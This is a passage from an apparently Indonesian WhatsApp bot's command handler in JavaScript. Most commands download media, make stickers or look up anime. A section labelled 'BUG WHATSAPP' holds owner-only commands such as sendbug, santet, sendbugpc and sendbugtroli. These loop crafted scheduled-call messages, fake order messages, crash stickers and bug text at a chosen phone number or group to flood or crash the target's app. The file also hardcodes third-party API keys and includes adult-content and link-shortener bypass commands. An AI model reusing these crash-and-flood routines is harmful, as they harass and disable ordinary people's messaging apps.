  let res = await fetch(`https://api.lolhuman.xyz/api/tiktok2?apikey=haikalgans&url=${args[0]}`)
  let x = await res.json()
  let anu = x.result
  let cap = `${global.done}`
  conn.sendMessage(m.chat, { video: { url: anu }, caption: cap }, { quoted: blue})
  } catch (er) {
					error9 = true;
				} finally {
					if (error9) {
						replyerror("Yah Proses Gagal :(");
					}
					}
}
break
case 'tiktokmp3': case 'ttmp3': case 'ttaudio': {
if (!text) return paycall( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return paycall(`Link Invalid!!`)
reply(global.wait)
require('./lib/tiktok').Tiktok(q).then( data => {
conn.sendMessage(m.chat, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: blue })
})
}
break
case 'tiktokslide': case 'ttslide': {
        if (!args[0]) throw `✳️ Example : ${prefix + command} https://vm.tiktok.com/ZMYG92bUh/`
        if (!args[0].match(/tiktok/gi)) throw `❎ Bukan Link Tiktok`
        reply(global.wait)
        let error19;
try {
        let res = await fetch(`https://api.fgmods.xyz/api/downloader/tiktok2?url=${args[0]}&apikey=Wvc5v8l7`)
        let data = await res.json()
        let cap = `${done}
▢ *Likes:* ${data.result.stats.likeCount}
▢ *Deskripsi:* ${data.result.title}
`
            for (let tt of data.result.images) {
                conn.sendImage(m.chat, tt.url, cap, blue)
            }
                              } catch (er) {
					error19 = true;
				} finally {
					if (error19) {
						replyerror("Yah Proses Gagal :(");
					}
					}
            }
break
case 'tt2': {
if (!q) return paycall( `Example : ${prefix + command} link`)
reply(global.wait)
let res = await fetch(`https://api.akuari.my.id/downloader/tiktok?link=${q}`)
let data = await res.json()
let json = data.respon
let cap = `𝑨𝑼𝑻𝑯𝑶𝑹 = ${json.author}\n𝐋𝐢𝐤𝐞 = ${json.like}\n𝐂𝐨𝐦𝐦𝐞𝐧𝐭 = ${json.comment}\n𝐒𝐡𝐚𝐫𝐞 = ${json.share}\n𝑫𝑬𝑺𝑪𝑹𝑰𝑷𝑻𝑰𝑶𝑵 = ${json.description}`
conn.sendMessage(m.chat, { video: { url: json.media }, caption: cap }, { quoted: fkontak})
};
break
case 'ttmp3backup': {
if (!q) return paycall( `Example : ${prefix + command} link`)
reply(global.wait)
let res = await fetch(`https://api.akuari.my.id/downloader/tiktok?link=${q}`)
let data = await res.json()
let json = data.respon
conn.sendMessage(m.chat, { audio: { url: json.music }, mimetype: 'audio/mp4' }, { quoted: fkontak })
};
break

//========================AKSARA JAWA=========================//
case 'aksarajawa': {
if (!text) return paycall( `Ketik sesuatu biar ketikan lu di generate jadi aksarajawa`)
reply(global.wait)
let error10;
try {
let response = await fetch(`https://api.akuari.my.id/other/latinkeaksara?query=${text}`)
let data = await response.json()   
  conn.sendText(from, data.hasil, fkontak)
  } catch (er) {
					error10 = true;
				} finally {
					if (error10) {
						replyerror("Yah Proses Gagal :(");
					}
					}
}
break
case 'latin': {
if (!text) return paycall( `Caranya kirim teks aksara jawa biar di translate in sama bot`)
reply(global.wait)
let error11;
try {
let response = await fetch(`https://api.akuari.my.id/other/aksarakelatin?query=${text}`)
let data = await response.json()   
  conn.sendText(from, data.hasil, fkontak)
  } catch (er) {
					error = true;
				} finally {
					if (error11) {
						replyerror("Yah Proses Gagal :(");
					}
					}
}
break

case 'lens': case 'googlelens': {
if (!/image/.test(mime)) return paycall(`Fitur Lens/Google Lens adalah fitur untuk mengambil teks di gambar, kegunaannya biar mudah ambil teks yang di foto, fitur ini masih tahap beta yang di kembangkan oleh developer shinchan senpai💖, cara pakainya kalian kirim foto yang ada teks nya lalu kalian (ketik : ${prefix} lens / ${prefix} googlelens).`)
reply(global.wait)
let media = await conn.downloadAndSaveMediaMessage(quoted);

  if (/image/.test(mime)) {
    let anu = await TelegraPh(media)
    let error12;
try {
let response = await fetch(`https://api.lolhuman.xyz/api/ocr?apikey=haikalgans&img=${anu}`)
let data = await response.json()
  conn.sendText(from, data.result, fkontak)
  } catch (er) {
					error12 = true;
				} finally {
					if (error12) {
						replyerror("Yah Proses Gagal :(");
					}
					}
}
}
break
//========================WALLPAPER=========================//
case 'wallpaper':
const { AnimeWallpaper } =require("anime-wallpaper")
if(!q) return paycall('Wallpaper apa yang kamu inginkan?')
reply(global.wait)
const wall = new AnimeWallpaper()
    const pages = [1,2,3,4]
        const random=pages[Math.floor(Math.random() * pages.length)]
        const wallpaper = await wall
            .getAnimeWall4({ title: q, type: "sfw", page: pages })
            .catch(() => null)
const i = Math.floor(Math.random() * wallpaper.length)
            await conn.sendMessage(m.chat, { caption: `*Query :* ${q}`, image: {url:wallpaper[i].image} }, { quoted: m} ).catch(err => {
                    return('Error!')
                })
//conn.sendMessage(m.chat,{image:{url:wallpaper[i].image},caption:`*Query :* ${q}`})            
break
case 'wallpaper2':{
reply(global.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/wallpaper`)       
            await conn.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: global.done}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
/*case 'wallpaper3': {
                if (!args.join(" ")) return paycall("Wallpaper apa yang kamu cari??")
                reply(global.wait)
		let { wallpaper } = require('./lib/scraperW')
                anu = await wallpaper(args)
                result = anu[Math.floor(Math.random() * anu.length)]
                conn.sendMessage(m.chat, { caption: `Title : ${result.title}\nCategory : ${result.type}\nDetail : ${result.source}\nMedia Url : ${result.image[2] || result.image[1] || result.image[0]}`, image: { url: result.image[0] } } , { quoted: m })
            }
            break*/
//========================WALLPAPER END=========================//
            case 'pinterest': {
              	if (!text) return paycall(`Apa yang mau kamu cari?`)
reply(global.wait)
let { pinterest } = require('./lib/scraper')
anutrest = await pinterest(text)
result = anutrest[Math.floor(Math.random() * anutrest.length)]
conn.sendMessage(m.chat, { image: { url: result }, caption: '⭔ Media Url : '+result }, { quoted: m })
}
break
//========================PINTEREST END=========================//
case 'pixiv': {
if (args.length == 0) return paycall(`Example: ${prefix + command} 63456028`)
reply(global.wait)
query = args.join(" ")
let error13;
try {
let res = await fetch(`https://api.lolhuman.xyz/api/pixivdl/${query}?apikey=haikalgans`)
let data = await res.json()
let memek = data.result
await conn.sendFile2(from, memek.images, `image`, done, blue)
} catch (er) {
					error13 = true;
				} finally {
					if (error13) {
						replyerror("Yah Proses Gagal :(");
					}
					}
}
break
case 'pixivdl': {
if (args.length == 0) return paycall(`Example: ${prefix + command} 63456028`)
reply(global.wait)
pixivid = args[0]
let error14;
try {
let ini_buffer = await fetch(`https://api.akuari.my.id/downloader/pixiv?id=${pixivid}&ext=.jpg`)
await conn.sendMessage(from, { image: { url: ini_buffer.url }, caption: `${global.done}` }, { quoted: fkontak })
} catch (er) {
					error14 = true;
				} finally {
					if (error14) {
						replyerror("Yah Proses Gagal :(");
					}
					}
}
break
//========================PIXIV END=========================//
case 'carihentai':
if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)
query = args.join(" ")
get_result = await fetchJson(`https://api.lolhuman.xyz/api/nhentaisearch?apikey=${apikey}&query=${query}`)
get_result = get_result.result
ini_txt = "🥵𝘿𝘼𝙏𝘼 𝘾𝙊𝘿𝙀 𝙃𝙀𝙉𝙏𝘼𝙄🥵 : \n"
for (var x of get_result) {
ini_txt += `Id : ${x.id}\n`
ini_txt += `Title English : ${x.title_english}\n`
ini_txt += `Title Japanese : ${x.title_japanese}\n`
ini_txt += `Native : ${x.title_native}\n`
ini_txt += `Page : ${x.page}\n`
ini_txt += "▬▭▬▭▬▭▬▭▬▬▭▬▭▬▬▭▬▭▬▭▬▭▬▬▭▬▭▬\n\n"
}
replyhentai(ini_txt)
break
case 'nhentai':
case 'ncode':
if (!text) return paycall(`Example: ${prefix + command} 344253`)
var body = text.replace(/\s+/g, '+')
if (!/[0-9]/.test(body)) throw ('only number')
reply(global.wait)
let error15;
try {
let res = await fetch(`https://api.lolhuman.xyz/api/nhentaipdf/${body}?apikey=haikalgans`)
let kontol = await res.json()
let anu = kontol.result
await conn.sendFile(m.chat, anu, `${body}.pdf`, blue)
} catch (er) {
					error15 = true;
				} finally {
					if (error15) {
						replyerror("Yah Proses Gagal :(");
					}
					}
break
//========================BOKEPNYA=========================//
case 'xnxx': case 'xnxxdl': {
	if (!text) return paycall(`Kirim Link Bokep di situs XNXX`)
        if (!text.includes('xnxx.com')) return paytod(`Kirim Link Bokep di situs XNXX`)
        reply(global.wait)
        const fg = require('api-dylux')
            let xn = await fg.xnxxdl(text)
conn.sendMessage(m.chat, { caption: `≡  *XNXX DOWNLOAD*
        
▢ *📌Title*: ${xn.title}
▢ *⌚Duration:* ${xn.duration}
▢ *🎞️Quality:* ${xn.quality}`, video: {url: xn.url_dl} }, { quoted: blue })
}
break
case 'xnxxsearch': {
	if (!text) return paycall(`Kirim Judul Bokep`)
	const fg = require('api-dylux')
	let res = await fg.xnxxSearch(text)
            let ff = res.result.map((v, i) => `${i + 1}┃ *Title* : ${v.title}\n*Link:* ${v.link}\n`).join('\n') 
              if (res.status) replybokep(ff)
              }
              break
//=============================================================//
case 'bypassouo': {
if (!args[0]) return paycall( `Example : ${prefix + command} link`)
reply(global.wait)
let error16;
try {
  let res = await fetch(`https://api.lolhuman.xyz/api/ouo?apikey=haikalgans&url=${args[0]}`)
  let data = await res.json()
  let bypassnya = data.result
 await conn.sendMessage(m.chat, { text: bypassnya }, {quoted: blue})
 } catch (er) {
					error16 = true;
				} finally {
					if (error16) {
						replyerror("Yah Proses Gagal :(");
					}
					}
}
break
case 'bypassmirror': {
if (!args[0]) return paycall( `Example : ${prefix + command} link`)
reply(global.wait)
let error17;
try {
  let res = await fetch(`https://api.lolhuman.xyz/api/mirrorcreator?apikey=haikalgans&url=${args[0]}`)
  let pemanggil = await res.json()
  let anuan = pemanggil.result
 await conn.sendMessage(m.chat, { text: anuan.dropapk }, {quoted: blue})
 } catch (er) {
					error17 = true;
				} finally {
					if (error17) {
						replyerror("Yah Proses Gagal :(");
					}
					}
}
break
//========================DOWNLOAD YOUTUBE=========================//
case 'yts': case 'ytsearch': {
if (!isCreator) return paycall('*khusus Premium*')
if (!text) return paycall(`Example : ${prefix + command} Dj malam pagi`)
let search = await yts(text)
let teks = '*YouTube Search*\n\n Result From '+text+'\n\n'
let no = 1
for (let i of search.all) {
teks += `⭔ No : ${no++}\n⭔ Type : ${i.type}\n⭔ Video ID : ${i.videoId}\n⭔ Title : ${i.title}\n⭔ Views : ${i.views}\n⭔ Duration : ${i.timestamp}\n⭔ Upload At : ${i.ago}\n⭔ Url : ${i.url}\n\n─────────────────\n\n`
}
ytreply(teks)
}
break
case 'play':  case 'song': {
if (!text) return paycall(`Example : ${prefix + command} DJ MALAM INI`)
const shinchanplaymp3 = require('./lib/ytdl2')
let yts = require("youtube-yts")
        let search = await yts(text)
        let anup3k = search.videos[0]
        reply(global.wait)
const pl= await shinchanplaymp3.mp3(anup3k.url)
await conn.sendMessage(m.chat,{
    audio: fs.readFileSync(pl.path),
    fileName: anup3k.title + '.mp3',
    mimetype: 'audio/mp4', ptt: false,
    contextInfo:{
        externalAdReply:{
            showAdAttribution: true,
            containsAutoReply: true,
            title:anup3k.title,
            body: ownername,
            thumbnail: await fetchBuffer(pl.meta.image),
            mediaType:2,
            mediaUrl:anup3k.url,
        }

    },
},{quoted: fkontak})
await fs.unlinkSync(pl.path)
}
break
case "ytmp3": case "ytaudio":
const shinchanmp3 = require('./lib/ytdl2')
if (args.length < 1 || !isUrl(text) || !shinchanmp3.isYTUrl(text)) return paycall(`Where's the yt link?\nExample: ${prefix + command} https://youtube.com/shorts/YQf-vMjDuKY?feature=share`)
reply(global.wait)
const audio=await shinchanmp3.mp3(text)
await conn.sendMessage(m.chat,{
    audio: fs.readFileSync(audio.path),
    mimetype: 'audio/mp4', ptt: false,
    contextInfo:{
        externalAdReply:{
            showAdAttribution: true,
            containsAutoReply: true,
            title:audio.meta.title,
            body: ownername,
            thumbnail: await fetchBuffer(audio.meta.image),
            mediaType:2,
            mediaUrl:text,
        }

    },
},{quoted: fkontak})
await fs.unlinkSync(audio.path)
break
case 'ytmp4': case 'ytvideo': {
const shinchanmp4 = require('./lib/ytdl2')
if (args.length < 1 || !isUrl(text) || !shinchanmp4.isYTUrl(text)) paycall(`Where is the link??\n\nExample : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`)
reply(global.wait)
const vid=await shinchanmp4.mp4(text)
const ytc=`
*🐼Tittle:* ${vid.title}
*🐼Date:* ${vid.date}
*🐼Duration:* ${vid.duration}
*🐼Quality:* ${vid.quality}`
await conn.sendMessage(m.chat,{
    video: {url:vid.videoUrl},
    caption: ytc
},{quoted: fkontak})
}
break
//========================INSTAGRAM DL============================//
case 'igvid': case 'igvideo': case 'igreels':
			if (args.length == 0) return reply(`Example: ${prefix + command} link video ig`)
			reply(global.wait)
			let error20;
try {
			axios.get(`https://api.lolhuman.xyz/api/instagram?apikey=haikalgans&url=${args[0]}`).then(({ data }) => {
				conn.sendMessage(from, { video: { url: data.result }, mimetype: 'video/mp4', caption : done, quoted: fkontak})
			})
			 } catch (er) {
					error20 = true;
				} finally {
					if (error20) {
						replyerror("Yah Proses Gagal :(");
					}
					}
			break
case 'igimg': case 'igfoto': {
        if (!args[0]) throw `✳️ Example : ${prefix + command} link foto Instagram`
        reply(global.wait)
        let error21;
try {
        let res = await fetch(`https://api.lolhuman.xyz/api/instagram2?apikey=haikalgans&url=${args[0]}`)
        let data = await res.json()
        let cap = `${done}`
            for (let i of data.result.media) {
                conn.sendImage(m.chat, i, cap, blue)
            }
                              } catch (er) {
					error21 = true;
				} finally {
					if (error21) {
						replyerror("Yah Proses Gagal :(");
					}
					}
            }
break
case 'igvid2': case 'igvideo2': case 'igreels2': {
        if (!args[0]) throw `✳️ Example : ${prefix + command} link foto Instagram`
        reply(global.wait)
        let error23;
try {
        let res = await fetch(`https://api.lolhuman.xyz/api/instagram2?apikey=haikalgans&url=${args[0]}`)
        let data = await res.json()
        let cap = `${done}`
            for (let b of data.result.media) {
                conn.sendMessage(from, { video: { url: b }, mimetype: 'video/mp4', caption : done, quoted: fkontak})
            }
                              } catch (er) {
					error23 = true;
				} finally {
					if (error23) {
						replyerror("Yah Proses Gagal :(");
					}
					}
            }
break
//========================END============================//
case 'anime':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)
                    query = args.join(" ")
                            let error22;
try {
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/anime?apikey=haikalgans&query=${query}`)
                    get_result = get_result.result
                    ini_txt = `Id : ${get_result.id}\n`
                    ini_txt += `Id MAL : ${get_result.idMal}\n`
                    ini_txt += `Title : ${get_result.title.romaji}\n`
                    ini_txt += `English : ${get_result.title.english}\n`
                    ini_txt += `Native : ${get_result.title.native}\n`
                    ini_txt += `Format : ${get_result.format}\n`
                    ini_txt += `Episodes : ${get_result.episodes}\n`
                    ini_txt += `Duration : ${get_result.duration} mins.\n`
                    ini_txt += `Status : ${get_result.status}\n`
                    ini_txt += `Season : ${get_result.season}\n`
                    ini_txt += `Season Year : ${get_result.seasonYear}\n`
                    ini_txt += `Source : ${get_result.source}\n`
                    ini_txt += `Start Date : ${get_result.startDate.day} - ${get_result.startDate.month} - ${get_result.startDate.year}\n`
                    ini_txt += `End Date : ${get_result.endDate.day} - ${get_result.endDate.month} - ${get_result.endDate.year}\n`
                    ini_txt += `Genre : ${get_result.genres.join(", ")}\n`
                    ini_txt += `Synonyms : ${get_result.synonyms.join(", ")}\n`
                    ini_txt += `Score : ${get_result.averageScore}%\n`
                    ini_txt += `Characters : \n`
                    ini_character = get_result.characters.nodes
                    for (var x of ini_character) {
                        ini_txt += `- ${x.name.full} (${x.name.native})\n`
                    }
                    ini_txt += `\nDescription : ${get_result.description}`
                    thumbnail = await getBuffer(get_result.coverImage.large)
                    await conn.sendImage(m.chat, thumbnail, ini_txt, blue)
                                                  } catch (er) {
					error22 = true;
				} finally {
					if (error22) {
						replyerror("Yah Proses Gagal :(");
					}
					}
                    break
                    
case 'brainly':
                    if (args.length == 0) return reply(`Example: ${prefix + command} siapakah sukarno`)
                    query = args.join(" ")
                    let error24;
try {
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/brainly?apikey=haikalgans&query=${query}`)
                    lala = get_result.result
                    ini_txt = "Beberapa Pembahasan Dari Brainly :\n\n"
                    for (var x of lala) {
                        ini_txt += `==============================\n`
                        ini_txt += `\`\`\`Pertanyaan :\`\`\`\n${x.question.content}\n\n`
                        ini_txt += `\`\`\`Jawaban :\`\`\`\n${x.answer.content}\n`
                        ini_txt += `==============================\n\n`
                    }
                    replybrainly(ini_txt)
                    } catch (er) {
					error24 = true;
				} finally {
					if (error24) {
						replyerror("Yah Proses Gagal :(");
					}
					}
                    break
//========================END============================//
case 'id' :
        if (!isCreator) return paycall(`*khusus Owner*`)
        paytod(`${m.chat}`)
        break
//========================BUG WHATSAPP=========================//
case 'sendbug': {
if (!isCreator) return m.reply(`*khusus Owner*`)
let memek = text.split("|")[0]+'@s.whatsapp.net'
let nomor = memek.replace(" ", "")
let jumlah = text.split("|")[1]
let secon = text.split("|")[2]
for (let i = 0; i < jumlah ; i++){
 var call = {
 scheduledCallCreationMessage: {
 callType: 2,
 scheduledTimestampMs:  Date.now(),
 title: `${weg}\n${tizi}`
 }
}
conn.relayMessage(nomor, call, {})
}
}
break
case 'oy': {
if (!isCreator) return m.reply("ngapain?") 
let memek = text.split("|")[0]+'@s.whatsapp.net'
let nomor = memek.replace(" ", "")
let jumlah = text.split("|")[1]
for (let i = 0; i < jumlah ; i++){
 var call = {
 scheduledCallCreationMessage: {
 callType: 2,
 scheduledTimestampMs:  Date.now(),
 title: `${weg}\n${tizi}`
 }
}
conn.relayMessage(nomor, call, {})
await sleep(2000)
conn.sendMessage(nomor, { sticker : thumb }, { quoted: shinuwu })
await sleep(2000)
conn.relayMessage(nomor, call, {})
await sleep(2000)
}
}
break
case 'oygc': {
if (!isCreator) return m.reply("ngapain?") 
let memek = text.split("|")[0]+'@g.us'
let nomor = memek.replace(" ", "")
let jumlah = text.split("|")[1]
for (let i = 0; i < jumlah ; i++){
 var call = {
 scheduledCallCreationMessage: {
 callType: 2,
 scheduledTimestampMs:  Date.now(),
 title: `${weg}\n${tizi}`
 }
}
conn.relayMessage(nomor, call, {})
await sleep(2000)
conn.sendMessage(nomor, { sticker : thumb }, { quoted: shinuwu })
await sleep(2000)
conn.relayMessage(nomor, call, {})
await sleep(2000)
}
}
break
case 'santet': {
if (!isCreator) return
let memek = text.split("|")[0]+'@s.whatsapp.net'
let nomor = memek.replace(" ", "")
let jumlah = text.split("|")[1]
let secon = text.split("|")[2]
for (let i = 0; i < jumlah ; i++){
conn.sendMessage(nomor, { sticker : virusgambar }, { quoted: shinuwu })
await sleep(60* secon)
}
}
break
case 'tesaja': {
conn.sendMessage(m.chat, { sticker : thumb }, { quoted: shinuwu })
}
break
case 'sendbuggc': {
if (!isCreator) return m.reply(`*khusus Owner*`)
let memek = text.split("|")[0]+'@g.us'
let nomor = memek.replace(" ", "")
let jumlah = text.split("|")[1]
let secon = text.split("|")[2]
for (let i = 0; i < jumlah ; i++){
var scheduledCallCreationMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": '1',
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": `${weg}\n${tizi}`,
}
}), { userJid: m.chat, quoted: m })
conn.relayMessage(nomor, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(60* secon)
}
}
break
case 'sendbugpc': {
if (!isCreator) return m.reply(`*khusus Owner*`)
num = q.split('|')[0]+'@s.whatsapp.net'
jumlah = q.split('|')[1]
let secon = text.split("|")[2]
for (let i = 0; i < jumlah; i++) {
var invite = generateWAMessageFromContent(num, proto.Message.fromObject({
"groupInviteMessage": {
         "groupJid": "120363144695962190@g.us",
	     "inviteCode": "63bqvAyYvuOQJtwf",
		 "inviteExpiration": "1689703732",
         "groupName": `${vapi()} ${philips}`,
         "jpegThumbnail": thumb,
         "caption": `${num}`
}
}), { userJid: m.chat, quoted: fbugstik })
conn.relayMessage(num, invite.message, { messageId: invite.key.id })
await conn.sendMessage(num, {text: `${weg} ${weg}`}, {quoted: fbugtext})
await sleep(60* secon)
}
}
break
case 'sendbugtroli': {
if (!isCreator) return m.reply(`*khusus Owner*`)
let memek = text.split("|")[0]+'@s.whatsapp.net'
let nomor = memek.replace(" ", "")
let jumlah = text.split("|")[1]
let secon = text.split("|")[2]
for (let i = 0; i < jumlah ; i++){
var troli = generateWAMessageFromContent(nomor, proto.Message.fromObject({
"orderMessage": {
                  "sellerJid": "6282134110253@s.whatsapp.net",
                  "itemCount": 7777777,
                  "message": `${weg} ${weg}`,
                  "orderTitle": "⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗"
}
}), { userJid: m.chat, quoted: fbugstik })
conn.relayMessage(nomor, troli.message, { messageId: troli.key.id })
await sleep(60* secon)
}
}
break
case 'sendbugtroligc': {
if (!isCreator) return m.reply(`*khusus Owner*`)
let memek = text.split("|")[0]+'@g.us'
let nomor = memek.replace(" ", "")
let jumlah = text.split("|")[1]
let secon = text.split("|")[2]
for (let i = 0; i < jumlah ; i++){
var troligc = generateWAMessageFromContent(nomor, proto.Message.fromObject({
"orderMessage": {
                  "sellerJid": "6282134110253@s.whatsapp.net",
                  "itemCount": 7777777,
                  "message": `${weg} ${weg}`,
                  "orderTitle": "⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗"
}
}), { userJid: m.chat, quoted: fbugstik })
conn.relayMessage(nomor, troligc.message, { messageId: troligc.key.id })
await sleep(60* secon)
}
}
break
case 'sendbugstik': {
if (!isCreator) return m.reply(`*khusus Owner*`)
let memek = text.split("|")[0]+'@s.whatsapp.net'
let nomor = memek.replace(" ", "")
let jumlah = text.split("|")[1]
for (let i = 0; i < jumlah ; i++){
conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: fbugstik})
await sleep(1000)
conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: fbugstik})
await sleep(1000)
conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: fbugstik})
await sleep(1000)
conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: fbugstik})
await sleep(1000)
conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: fbugstik})
await sleep(1000)
}
}
break
case 'bugtxt': {
if (!isCreator) return m.reply(`*khusus Owner*`)
 let memek = text.split("|")[0]+'@s.whatsapp.net'
let nomor = memek.replace(" ", "")
let jumlah = text.split("|")[1]
for (let i = 0; i < jumlah ; i++){
conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: fbugtext})
await sleep(1000)
conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: fbugtext})
await sleep(1000)
conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: fbugtext})
await sleep(1000)
conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: fbugtext})
await sleep(1000)
conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: fbugtext})
await sleep(1000)
}
}
break
case 'jadikatalog': {
if (!isCreator) return paycall(`*khusus Owner*`)
let media = await quoted.download()
reply(global.wait)
var messa = await prepareWAMessageMedia({ image: media }, { upload: conn.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "",
"jpegThumbnail": thumb,
"title": `${text} ${philips}`,
"description": `${text} ${vapi()}`,
"productImageCount": 999999999,
"firstImageId": 1,
"retailerId": `〔 ıll ☄︎ ⫹⫺ ᴺᵉʳᵒ☃︎ˢᵉⁿᵖᵃⁱ 浤 ☄︎ llı 〕`,
"bodyText": `${text}`,
"footerText": `${text}`,
"url": "https://youtube.com/channel/UCqCZmaSvnbsre9EKEyGtviQ"
},
"businessOwnerJid": "6282134110253@s.whatsapp.net",
"contextInfo": {
"forwardingScore": 150,
"isForwarded": true
}
}
}), { userJid: m.chat, quoted: fkontak })
conn.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
}
break
case 'tokatalog': {
if (!isCreator) return m.reply(`*khusus Owner*`)
let atas = text.split('|')[0] ? text.split('|')[0] : '-'
let bawah = text.split('|')[1] ? text.split('|')[1] : '-'
let media = await quoted.download()
reply(global.wait)
var messa = await prepareWAMessageMedia({ image: media }, { upload: conn.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "",
"jpegThumbnail": thumb,
"title": `${atas}`,
"description": `${bawah}`,
"productImageCount": 999999999,
"firstImageId": 1,
"retailerId": `〔 ıll ☄︎ ⫹⫺ ᴺᵉʳᵒ☃︎ˢᵉⁿᵖᵃⁱ 浤 ☄︎ llı 〕`,
"bodyText": `𝙎𝙃𝙄𝙉𝘾𝙃𝘼𝙉 メ 𝙒𝙄𝘽𝙐𝙎𝙊𝙁𝙏`,
"footerText": `𝙎𝙃𝙄𝙉𝘾𝙃𝘼𝙉 メ 𝙒𝙄𝘽𝙐𝙎𝙊𝙁𝙏`,
"url": "https://youtube.com/channel/UCqCZmaSvnbsre9EKEyGtviQ"
},
"businessOwnerJid": "6282134110253@s.whatsapp.net",
"contextInfo": {
"forwardingScore": 999,
"isForwarded": true
}
}
}), { userJid: m.chat, quoted: fkontak })
conn.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
}
break
//========================BUG WHATSAPP=========================//
case 'setpp': {
if (!isCreator) return m.reply(`*khusus Owner*`)
if (!quoted) return paycall(`Send/Reply Images With Captions ${prefix+command}`)
if (!/image/.test(mime)) return paycall(`Send/Reply Image With Caption ${prefix + command}`)
if (/webp/.test(mime)) return paycall(`Send/Reply Image With Caption ${prefix + command}`)
reply(global.wait)
var media = await conn.downloadAndSaveMediaMessage(quoted)
try {
if (args[0] == "/full") {
const { generateProfilePicture } = require("./lib/myfunc")
var { img } = await generateProfilePicture(media)
await conn.query({ tag: 'iq',attrs: { to: botNumber, type:'set', xmlns: 'w:profile:picture'}, content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]})
} else { await conn.updateProfilePicture(botNumber, { url: media }) }
reply('DONE')
} catch { reply('Gagal Mengganti Photo Profile') }
}
break
//STICKER
case 's': case 'sticker': case 'stiker': {
if (!quoted) return paycall(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
if (quoted.isAnimated) {
               let media = await conn.downloadAndSaveMediaMessage(quoted)
               let webpToMp4 = await webp2mp4File(media)
               let encmedia = await conn.sendVideoAsSticker(m.chat, webpToMp4.result, blue, {
                  packname: global.packname,
                  author: global.author
               })
               await fs.unlinkSync(encmedia)
            } else if (/image/.test(mime)) {
               let media = await quoted.download()
               let encmedia = await conn.sendImageAsSticker(m.chat, media, blue, {
                  packname: global.packname,
                  author: global.author
               })
               await fs.unlinkSync(encmedia)
            } else if (/video/.test(mime)) {
               if ((quoted.msg || quoted).seconds > 11) return paycall('Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds')
               let media = await quoted.download()
               let encmedia = await conn.sendVideoAsSticker(m.chat, media, blue, {
                  packname: global.packname,
                  author: global.author
               })
               await fs.unlinkSync(encmedia)
            } else {
               paycall(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
            }
         }
         break
case 'toimg': {
	reply(global.wait)
	const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`
        }
        if (!m.quoted) return paycall(`_Reply to Any Sticker._`)
        let mime = m.quoted.mtype
if (mime =="imageMessage" || mime =="stickerMessage")
{
        let media = await conn.downloadAndSaveMediaMessage(m.quoted)
        let name = await getRandom('.png')
        exec(`ffmpeg -i ${media} ${name}`, (err) => {
        	fs.unlinkSync(media)
            let buffer = fs.readFileSync(name)
            conn.sendMessage(m.chat, { image: buffer }, { quoted: blue })      
fs.unlinkSync(name)
        })
        
} else return paycall(`Please reply to non animated sticker`)
    }
    break
case 'toaud': case 'toaudio': {
            if (!/video/.test(mime) && !/audio/.test(mime)) return paycall(`Send/Reply Video/Audio You Want to Use as Audio With Caption ${prefix + command}`)
            if (!quoted) return paycall(`Send/Reply Video/Audio You Want to Use as Audio With Caption ${prefix + command}`)
            reply(global.wait)
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            conn.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : blue })
            }
            break
            case 'tomp3': {
            if (/document/.test(mime)) return paycall(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`)
            if (!/video/.test(mime) && !/audio/.test(mime)) return paycall(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`)
            if (!quoted) return paycall(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`)
            reply(global.wait)
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            conn.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${conn.user.name}.mp3`}, { quoted : blue })
            }
            break
            case 'tovn': case 'toptt': {
            if (!/video/.test(mime) && !/audio/.test(mime)) return paycall(`Reply Video/Audio That You Want To Be VN With Caption ${prefix + command}`)
            if (!quoted) return paycall(`Reply Video/Audio That You Want To Be VN With Caption ${prefix + command}`)
            reply(global.wait)
            let media = await quoted.download()
            let { toPTT } = require('./lib/converter')
            let audio = await toPTT(media, 'mp4')
